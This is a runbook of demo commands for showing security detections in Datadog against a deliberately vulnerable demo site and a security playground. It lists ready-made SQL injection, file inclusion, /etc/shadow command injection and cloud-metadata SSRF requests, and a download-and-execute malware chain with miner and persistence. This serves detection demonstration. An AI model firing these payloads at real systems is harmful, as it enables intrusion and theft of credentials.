# Demo Commands — Quick Reference

Run these in order during the demo. Each section maps to a part of the demo script.

---

## Pre-warm (run ~5 min before going live)

```bash
# Fires AAP + CWS signals so they're ready to show in Datadog
./scripts/security-demo.sh

# Runs the browser ATO attack (41 login attempts → account compromise signal + RUM replay)
python scripts/ato_browser_attack.py
```

---

## Live demo commands


```bash
# SQL Injection
curl 'https://mcse-dogwiki.com/api/vuln/sqli?breed=%27%20OR%20%271%27=%271'

# Local File Inclusion
curl 'https://mcse-dogwiki.com/api/vuln/lfi?file=/etc/passwd'

# Command Injection
curl 'https://mcse-dogwiki.com/api/vuln/cmd?cmd=cat%20/etc/shadow'

# SSRF → AWS metadata
curl 'https://mcse-dogwiki.com/api/vuln/ssrf?url=http://169.254.169.254/latest/meta-data/'

# CWS post-exploitation chain
./scripts/security-demo.sh cws

# ATO browser attack (opens Chrome)
python scripts/ato_browser_attack.py
```

---

### Security Playground — RCE malware chain

Run from the `datadog-security-playground` repo. Paste each command into the `/inject` UI
**one at a time** and wait for the Datadog signal to fire before moving to the next step.

```bash
# Run the full interactive detonation script (prompts before each step)
cd /Users/lahoucine.elhaouri/Desktop/Projects/datadog-security-playground
./scenarios/rce-malware/detonate.sh
```

Or paste manually into the `/inject` endpoint in this order:

| Step | Command | Expected signal |
|------|---------|-----------------|
| 1 — Install curl | `apt update && apt install -y curl` | Package manager execution inside container |
| 2 — Download payload | `curl -O https://raw.githubusercontent.com/DataDog/datadog-security-playground/main/assets/rce-malware/payload.sh` | Outbound network connection / file drop |
| 3 — Make executable | `chmod +x payload.sh` | chmod on downloaded file |
| 4 — Execute | `./payload.sh` | Malware hash match + crypto miner + persistence |
| 5 — Cleanup | `pkill -f 'malware' \|\| true; rm -f /tmp/malware /var/www/html/malware payload.sh 2>/dev/null \|\| true; sed -i '/malware/d' /etc/rc.common 2>/dev/null \|\| true; sed -i '/FAKE+DEMO/d' ~/.ssh/authorized_keys 2>/dev/null \|\| true` | File deletion + process kill + ssh key scrub |

---

## Setup (one-time, before demo day)

```bash
# Instrument the security playground app (run once after playground is deployed)
./scripts/setup-playground.sh
```
